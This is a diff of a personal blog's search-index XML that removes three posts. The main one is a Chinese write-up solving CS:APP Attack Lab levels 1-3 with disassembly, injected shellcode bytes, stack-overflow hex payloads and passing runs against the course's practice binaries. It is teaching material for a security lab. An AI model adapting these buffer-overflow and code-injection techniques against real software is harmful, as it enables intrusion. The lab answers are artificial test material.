@@ -533,65 +533,6 @@ T_0\\
       </tags>
   </entry>
   <entry>
-    <title>操作系统之进程间通信</title>
-    <url>/2020/06/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</url>
-    <content><![CDATA[<p>本章节包括两个小节</p>
-<ol>
-<li>进程间通信 (InterProess Communicatiin,IPC)</li>
-<li>经典的IPC问题</li>
-</ol>
-<a id="more"></a>
-<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>在本小节会涉及到：</p>
-<ol>
-<li>什么是临界区资源<ol>
-<li>竞争</li>
-<li>保证临界区互斥的4个条件</li>
-</ol>
-</li>
-<li>互斥的策略1 (Busy Waiting)<ol>
-<li>禁止中断</li>
-<li>锁变量</li>
-<li>严格轮换法</li>
-<li>⭐Peterson 算法</li>
-<li>TSL 指令</li>
-</ol>
-</li>
-<li>互斥的策略2<ol>
-<li>上述策略的缺陷（忙等待 优先级反向）</li>
-<li>Sleep &amp; Wakeup<ol>
-<li>问题：唤醒丢失</li>
-</ol>
-</li>
-<li>⭐信号量 Semaphore<ol>
-<li>互斥信号量 Mutexe</li>
-<li>PV操作</li>
-</ol>
-</li>
-<li>管程 Monitor</li>
-<li>消息传递</li>
-<li>屏障</li>
-</ol>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TODO：第四节：IPC</span><br></pre></td></tr></table></figure>
-<h2 id="Classical-IPC-Problems"><a href="#Classical-IPC-Problems" class="headerlink" title="Classical IPC Problems"></a>Classical IPC Problems</h2><p>本小节将涉及到几个常见IPC模型：</p>
-<ol>
-<li>生产者与消费者</li>
-<li>读者与写者</li>
-<li>进餐的哲学家</li>
-</ol>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-        <category>专业课</category>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-        <tag>操作系统</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>时与光W_202006-4</title>
     <url>/2020/06/28/%E6%97%B6%E4%B8%8E%E5%85%89W_202006-4/</url>
     <content><![CDATA[<p>2020年6月22日 ~ 28日.</p>
@@ -643,218 +584,6 @@ T_0\\
       </tags>
   </entry>
   <entry>
-    <title>时与光H_2020上半年</title>
-    <url>/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89H-2020%E4%B8%8A%E5%8D%8A%E5%B9%B4/</url>
-    <content><![CDATA[<p>2020年1月 ~ 6月</p>
-<p>关键词: 疫情, 学习, 健身</p>
-<a id="more"></a>
-<p>第一篇半年记, 一时间竟然有些不知道该些写什么.</p>
-<p>从头说起吧, 纯流水账. </p>
-<p>明天再写吧(咕咕警告)</p>
-]]></content>
-      <categories>
-        <category>时与光</category>
-      </categories>
-      <tags>
-        <tag>小结</tag>
-        <tag>半年记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSAPP-Lab笔记3:Attack</title>
-    <url>/2020/07/24/CSAPP-Lab%E7%AC%94%E8%AE%B03-Attack/</url>
-    <content><![CDATA[<p>这是我在2020年7月3日~7月8日完成的Attack Lab的题解与笔记</p>
-<p>攻击实验室是CS:APP 配套实验中的第三个实验, 通过缓冲区溢出和面向返回编程技术实现程序控制. 并学习相关技术, 巩固C运行时状态.</p>
-<p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p>
-<p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab3-AttackLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p>
-<a id="more"></a>
-<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
-<li>准备工作</li>
-<li>题目说明<ol>
-<li>Hex2raw 工具讲解</li>
-<li>Byte Codes生成s</li>
-</ol>
-</li>
-<li>题解: CTARGET <ol>
-<li>Level1</li>
-<li>Level2</li>
-<li>Level3</li>
-</ol>
-</li>
-<li>题解: RTARGET <ol>
-<li>Gadget Farm 的使用</li>
-<li>RLevel2</li>
-</ol>
-</li>
-<li>后记</li>
-</ol>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>本实验在教材中只对应了两小节的内容, 讲座也仅有Lec 9 , 需要大量补充学习.</p>
-<p>请一定要在 <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">官网下载</a> 并阅读 attack.pdf</p>
-<h2 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h2><p>默认你已经阅读过教材的 3.10 部分</p>
-<p>本题包括两部分, Ctarget与Rarget. 第一部分是利用缓冲区溢出以及代码注入技术进行攻击; 第二部分是利用面向返回编程方法对代码执行进行控制.</p>
-<h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>本题需要你实现编写一个 txt 文件, 必须仅有十六进制数字与空格组成. 通过Hex2raw 工具将该文件转为二进制文件filename 再进行下一步.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用</span><br><span class="line">.&#x2F;ctarget -i filename -q</span><br><span class="line">或者</span><br><span class="line">.&#x2F;rtarget -i filename -q</span><br></pre></td></tr></table></figure>
-<p> 其中 <code>-i</code>指令表示通过文件输入, <code>-q</code>表示脱网使用. 如果你也是自学者, 必须每次执行都加上这个参数.</p>
-<p>cookie 是每个CMU学生的一个身份识别码. 如果你是自学者, cookie应该都是0x59b997fa, 这串数字会在解题中扮演一定的角色.</p>
-<h3 id="A-Hex2raw-工具讲解"><a href="#A-Hex2raw-工具讲解" class="headerlink" title="A:Hex2raw 工具讲解"></a>A:Hex2raw 工具讲解</h3><p>由 <code>in.txt</code>文件转为二进制文件<code>out</code>需要执行代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;hex2raw &lt;in.txt &gt; out</span><br></pre></td></tr></table></figure>
-<h3 id="B-ByteCodes生成"><a href="#B-ByteCodes生成" class="headerlink" title="B:ByteCodes生成"></a>B:ByteCodes生成</h3><p>众所周知, 汇编代码是与机器的字节码一一对应的, 那么如果由汇编代码转化为字节编码呢? 我们只需要先撰写汇编代码文件 <code>example.s</code> , 使用 gcc 将其编译, 再将其反编译为中间文件即可.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c example.s</span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>
-<p>打开 example.d 即可看见对应的机器码了.</p>
-<h2 id="题解-CTARGET"><a href="#题解-CTARGET" class="headerlink" title="题解: CTARGET"></a>题解: CTARGET</h2><p>我们首先明确一下我们要干什么. 假设你已经阅读过教材 3.10.3 小结, 你应该知道我们的目标是利用缓冲区溢出来使得函数返回时返回至另外的,出乎意料的, 由我们(攻击者)提供的函数地址上. 基本的原理不在这里多说.</p>
-<p>下面的叙述均基于 CTARGET  为背景.</p>
-<h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a><strong>Level1</strong></h3><h4 id="test函数"><a href="#test函数" class="headerlink" title="test函数"></a>test函数</h4><p>这个函数是我们将攻击的代码. 我们通过 <code>getbuf</code> 函数输入一串字符, 理论上正常返回时会返回整型 <code>1</code> 储存在 <code>val</code>中 并打印, 退出. </p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test 函数的C语言表述</span></span><br><span class="line"><span class="number">1</span><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>下面来观察汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;test 函数的汇编表述</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">    0x0000000000401968 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">    0x000000000040196c &lt;+4&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401971 &lt;+9&gt;:	callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">    0x0000000000401976 &lt;+14&gt;:	mov    %eax,%edx</span><br><span class="line">    0x0000000000401978 &lt;+16&gt;:	mov    $0x403188,%esi</span><br><span class="line">    0x000000000040197d &lt;+21&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x0000000000401982 &lt;+26&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401987 &lt;+31&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x000000000040198c &lt;+36&gt;:	add    $0x8,%rsp</span><br><span class="line">    0x0000000000401990 &lt;+40&gt;:	retq</span><br></pre></td></tr></table></figure>
-<p>我们注意&lt;+9&gt; 这一行, <code>callq</code> 函数的操作对象是一个地址, 目前这个地址是指向到 <code>getbuf</code>函数</p>
-<p>在<code>getbuf</code>结束后, 应当返回到下一个地址, 即0x401976 , 称为原地址. </p>
-<blockquote>
-<p>事实上, 当我们在使用<code>callq</code>某个函数的时候, 下一条指令的地址(即上面提到的原地址) 会被push进栈中. 换言之, 当被调用函数结束, 执行 <code>retq</code>指令时, 是读取栈顶的元素作为跳转的地址. 在正常情况下就会跳转至原地址, 程序继续运行.</p>
-</blockquote>
-<p>我们的目标就是替换掉栈顶的原地址, 将其修改为我们期望转到的 <code>touch1</code>函数的开始地址, 称为目标地址.</p>
-<p>于是任务变成了:</p>
-<ol>
-<li>找到堆栈中原地址的储存位置</li>
-<li>确定目标地址的地址</li>
-<li>将原地址替换为目标地址</li>
-</ol>
-<h4 id="getbuf-函数"><a href="#getbuf-函数" class="headerlink" title="getbuf 函数"></a>getbuf 函数</h4><p>我们可以看到它的C代码如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//getbuf 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	GETs(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>首先的问题是, 我们需要知道这个缓冲区设置有多长? .我们照例查看其汇编代码:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;getbuf()</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq</span><br></pre></td></tr></table></figure>
-<p>我们注意到在代码开始处, 堆栈扩充了 0x28 个大小. </p>
-<p>这说明缓冲区大小即为0x28</p>
-<blockquote>
-<p>BUFF_SIZE 大小应该是与缓冲区是两个概念.</p>
-<p>例如 教材3.10小节的代码. 实际上分配的字符数组为 <code>buf[8]</code>, 但是体现在汇编代码中就变成了<code>subq $24,%rsp</code> , 此处SIZE应该是8 , 而缓冲区大小则是 0x24.</p>
-</blockquote>
-<p>在整个过程中栈的变化是这样的:</p>
-<blockquote>
-<p>假设在test函数的<code>callq</code>语句调用之前, 栈顶指针<code>$rsp</code> 为 0x666600, 当前执行语句 <code>$rip</code> 为0x401971</p>
-<ol>
-<li>调用<code>callq</code>语句, 将下一条语句( 原地址, 0x0401976) 推入栈中, 即0x666600处, 栈指针 <code>$rsp</code>  变为0x666601</li>
-<li>进入<code>getbuf</code>语句, 在<code>0x4017a8</code>处分配了0x28个栈, 此时栈顶指针为0x666629</li>
-<li><code>getbuf</code>函数正常运行. 直到读入过量字符数组数据时, 将0x666600处的原地址覆盖为目标地址 ,此时栈顶依旧为0x666629</li>
-<li>继续运行至0x4017b9处, 收回栈空间, 此时栈顶又变为0x666601</li>
-<li><code>retq</code>语句, 取栈顶元素0x666600处的地址 (已经被覆盖成目标地址了) 并跳转. 即达到我们的目的.</li>
-</ol>
-<p>嗯……应该不会有人疑惑上一步栈顶不是0x666601为什么取0x666600的元素吧…</p>
-<p>因为栈指针是指向栈顶下一个地址的…</p>
-</blockquote>
-<p>不妨使用gdb的查看指令检验一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;在 +12 设置一个断点</span><br><span class="line">&#x2F;&#x2F;事先输入的字符串为 &quot;abcdef&quot;</span><br><span class="line">(gdb) print (char*) ($rsp)</span><br><span class="line">$1 &#x3D; 0x5561dc78 &quot;abcdef&quot;</span><br><span class="line">&#x2F;&#x2F;可以看出, 堆栈的起始位置即储存了输入的字符串</span><br><span class="line"></span><br><span class="line">(gdb) x&#x2F;a ($rsp+0x28) </span><br><span class="line">0x5561dca0:	0x401976 &lt;test+14&gt;</span><br><span class="line">&#x2F;&#x2F;可以看出, 当我们试图查看 ($rsp+0x28) 储存的地址时, 发现正好时test+14的地址, 也就是我们的原地址.</span><br></pre></td></tr></table></figure>
-<p>那么我们现在只需要使用目标地址替换原地址即可.</p>
-<h4 id="touch1-函数"><a href="#touch1-函数" class="headerlink" title="touch1 函数"></a>touch1 函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;touch1 反汇编</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:	mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:	callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
-<p>显然目标地址就是 <code>0x4017c0</code></p>
-<p>因此, 我们应当输入的数字如下:</p>
-<blockquote>
-<p>00 00 00 00 00 00 00 00 00 00 </p>
-<p>00 00 00 00 00 00 00 00 00 00 </p>
-<p>00 00 00 00 00 00 00 00 00 00 </p>
-<p>00 00 00 00 00 00 00 00 00 00 </p>
-<p>c0 17 40 00 00 00 00 00 00 00 </p>
-</blockquote>
-<p>上面的内容不能直接在<code>ctarget</code>运行时输入, 而要使用 <code>Hex2raw</code>工具处理. 具体请参看上面的  <code>Hex2raw</code> 讲解部分.</p>
-<p>我们将上述材料存储在文件<code>in.txt</code>内, 并使用 <code>Hex2raw</code>工具将其转化为 二进制 文件并输入. </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw  &lt;in.txt&gt; out</span><br><span class="line">.&#x2F;ctarget -i out -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br></pre></td></tr></table></figure>
-<p>说明我们已经过了第一关</p>
-<hr>
-<h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><p>第二题的背景依旧是test函数. 除了将getbuf函数中的返回地址改为touch2函数的地址外, 还需要将注入的字符串作为代码运行. 相对复杂.</p>
-<p>我们先来看touch2函数</p>
-<h4 id="touch2-函数"><a href="#touch2-函数" class="headerlink" title="touch2 函数"></a>touch2 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//touch2 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (val == cookie)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val); </span><br><span class="line">      validate(<span class="number">2</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>,val); </span><br><span class="line">      fail(<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> 可见, touch2函数中会进行参数val与你的cookie进行比较, 当相同时才认为你通关. 接着看touch2的汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;touch2 函数的汇编表述</span><br><span class="line">Dump of assembler code for function touch2:</span><br><span class="line">    0x00000000004017ec &lt;+0&gt;:	sub    $0x8,%rsp</span><br><span class="line">    0x00000000004017f0 &lt;+4&gt;:	mov    %edi,%edx</span><br><span class="line">    0x00000000004017f2 &lt;+6&gt;:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">    0x00000000004017fc &lt;+16&gt;:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</span><br><span class="line">    0x0000000000401802 &lt;+22&gt;:	jne    0x401824 &lt;touch2+56&gt;</span><br><span class="line">    0x0000000000401804 &lt;+24&gt;:	mov    $0x4030e8,%esi</span><br><span class="line">    0x0000000000401809 &lt;+29&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x000000000040180e &lt;+34&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401813 &lt;+39&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401818 &lt;+44&gt;:	mov    $0x2,%edi</span><br><span class="line">    0x000000000040181d &lt;+49&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">    0x0000000000401822 &lt;+54&gt;:	jmp    0x401842 &lt;touch2+86&gt;</span><br><span class="line">    0x0000000000401824 &lt;+56&gt;:	mov    $0x403110,%esi</span><br><span class="line">    0x0000000000401829 &lt;+61&gt;:	mov    $0x1,%edi</span><br><span class="line">    0x000000000040182e &lt;+66&gt;:	mov    $0x0,%eax</span><br><span class="line">    0x0000000000401833 &lt;+71&gt;:	callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401838 &lt;+76&gt;:	mov    $0x2,%edi</span><br><span class="line">    0x000000000040183d &lt;+81&gt;:	callq  0x401d4f &lt;fail&gt;</span><br><span class="line">    0x0000000000401842 &lt;+86&gt;:	mov    $0x0,%edi</span><br><span class="line">    0x0000000000401847 &lt;+91&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
-<p>这里注意一下 +4 行. <code>%edi</code> 还记得吗? 是默认的传入函数的第一个参数. 也就是说, 我们要在调用touch2之前, 将 <code>%edi</code>寄存器的值设置为我们的cookie. 如果只是类似上一题中的代码跳转的话, 我们没有办法对寄存器进行实际的修改, 所以我们需要将自己的代码注入进去后能够实际运行它们.</p>
-<h4 id="注入代码的执行"><a href="#注入代码的执行" class="headerlink" title="注入代码的执行"></a>注入代码的执行</h4><p>具体的操作为: getbuf 结束后, 返回地址指向栈中. (准确的说是我们注入的字符数组) 使得我们注入的字符被解析成汇编代码并被运行. 在这段注入的代码末尾再跳转进touch2函数.</p>
-<p>也就是说, 我们注入的字符需要实际上实现下面这段汇编代码的功能.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;注入代码需要实现的功能</span><br><span class="line">&#x2F;&#x2F;这些保存在 touch2_tmp.s 中</span><br><span class="line">mov $0x59b997fa,%rdi		&#x2F;&#x2F;将cookie写入%edi寄存器</span><br><span class="line">pushq $0x4017ec				&#x2F;&#x2F;将touch2首地址推入栈顶</span><br><span class="line">retq						&#x2F;&#x2F;retq在执行时,将跳转touch2函数</span><br></pre></td></tr></table></figure>
-<p>通过使用Byte Codes生成器(参看对应的讲解), 我们可以拿到这些ByteCode:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c touch2_tmp.s 			&#x2F;&#x2F;使用汇编器生成二进制的可重定位目标程序touch2_tmp.o</span><br><span class="line">objdump -d touch2_tmp.o &gt;touch2_tmp.d	&#x2F;&#x2F;使用objdump将目标文件得到中间文件</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;下面是中间文件touch2_tmp.d中的内容,有精间</span><br><span class="line">0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>
-<h4 id="最后的小处理"><a href="#最后的小处理" class="headerlink" title="最后的小处理"></a>最后的小处理</h4><p>我们还需要对最终的in2文件进行小小的处理</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;这是 in2.txt 文件中的内容</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
-<p>上述代码的前3行就是我们拿到的 touch2_tmp.d 中的ByteCode</p>
-<p>4-7行是为了填充缓冲区, 事实上1-7行一共有 0x28   个字符  <span style="background-color: #252525">不信你数数</span></p>
-<p>第8行是将getbuf函数的返回地址覆盖为第1行的地址 0x5561dc78, 这个地址是很容易拿到的.</p>
-<p><strong>大功告成</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in2.txt&gt; out2</span><br><span class="line">.&#x2F;ctarget -i out2 -q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
-<p>第二关就过啦~~</p>
-<hr>
-<h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><p>第三题的背景依旧是test函数. 表面逻辑: 在getbuf 函数结束后跳转至 touch3 函数. 并且在touch3函数中需要调用hexmatch函数, 后者是这么一个函数: 传入一个地址, 并读取该地址存储的字符串, 这个字符串应该是与cookie相同. (不包括前缀0x).</p>
-<p>整体的思路类似Level2, getbuf 函数结束后跳转至缓冲区中注入的代码. 在注入代码中将参数1设置为字符串的地址, 并且注入代码段结束后跳转至touch3函数. </p>
-<p>在retq语句跳转至其他函数我们已经的轻车熟路了, 这里直接给出touch3的首地址: <code>0x4018fa</code>, 我们需要在注入代码中实现该地址的入栈, 这样注入代码的返回会读取栈顶, 从而跳转至touch3.</p>
-<p>基本分析完毕, 现在需要考虑的只剩:</p>
-<ol>
-<li>注入什么字符串?</li>
-<li>将字符串注入在哪?</li>
-</ol>
-<h4 id="字符串注入内容"><a href="#字符串注入内容" class="headerlink" title="字符串注入内容"></a>字符串注入内容</h4><p>我们需要将cookie转化为字符串, 这里需要注意两点: </p>
-<ol>
-<li>每个字符占一个字节. 使用ASCII码表示</li>
-<li>字符串的结尾需要使用<code>\0</code>结尾</li>
-</ol>
-<p>在Linux平台下, 执行<code>man ascii</code>命令可以获取ASCII码表, 对应的编码很容易对照获得</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;cookie 的ASCII表述</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
-<h4 id="字符串注入位置"><a href="#字符串注入位置" class="headerlink" title="字符串注入位置"></a>字符串注入位置</h4><p>这里比较坑. </p>
-<p>我们看一下 hexmatch 函数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hexmatch C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">   <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>()%<span class="number">100</span>;</span><br><span class="line">   <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">   <span class="keyword">return</span> strncmo(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>当我们在对缓冲区写入的时候, 实际上的可以写入的地方包括: test函数的栈帧, getbuf函数的栈帧, 以及其他地方. 但是当我们从getbuf函数返回的时候, 原本的getbuf栈帧被回收(虽然里面的数据没有清掉) , 并且在之后分配在了hexmatch 的栈帧上. </p>
-<p>那么栈的分配与回收仅仅是栈指针的变动, 可不可以将数据依旧储存在栈帧里面呢? 很遗憾也是不行的. 在hexmatch函数中划分了一个长度为110 的char数组, 并且将s字符串的地址设置为其中的的任意处, 这就使得你原本储存的数据<strong>有可能</strong>被覆盖掉.</p>
-<p>于是, 我们选择将数据写入test函数的栈帧中.</p>
-<p><strong>存疑</strong>: 可不可以将数据写入栈的其他位置? 比如栈 120 处.</p>
-<h4 id="字节代码的编写"><a href="#字节代码的编写" class="headerlink" title="字节代码的编写"></a>字节代码的编写</h4><p>根据以上分析, 我们已经能够写出需要注入的部分</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi      &#x2F;&#x2F;将字符串地址推入rdi 此条地址(执行代码的首地址)为0x5561dc78</span><br><span class="line">pushq $0x4018fa             &#x2F;&#x2F;touch3地址</span><br><span class="line">retq</span><br><span class="line">...补全缓冲区 28</span><br><span class="line">...缓冲区内的执行代码的首地址 (8位地址)0x5561dc78</span><br><span class="line">...储存cookie, 写入语句 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
-<p>上述1-3行, 是将会执行的代码, 包括将字符串地址设为参数1, 将touch3地址入栈, 以及返回touch3</p>
-<p>第4行是填满缓冲区的, 1-4行总计28字节</p>
-<p>缓冲区后属于test的栈帧, 最底处保存的是getbuf的retq返回地址, 指向执行代码的首地址.</p>
-<p>test更往后的地方就是我们储存cookie的地方. 此处的地址即为字符串地址0x0x5561dca8</p>
-<h4 id="最终答案"><a href="#最终答案" class="headerlink" title="最终答案"></a>最终答案</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
-<p>1-3: 执行代码</p>
-<p>4-7: 填充</p>
-<p>8: 执行代码的首地址</p>
-<p>9: 字符串地址的首地址</p>
-<p><strong>大功告成</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw &lt;in3.txt&gt; out3</span><br><span class="line">.&#x2F;ctarget -i out3 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
-<hr>
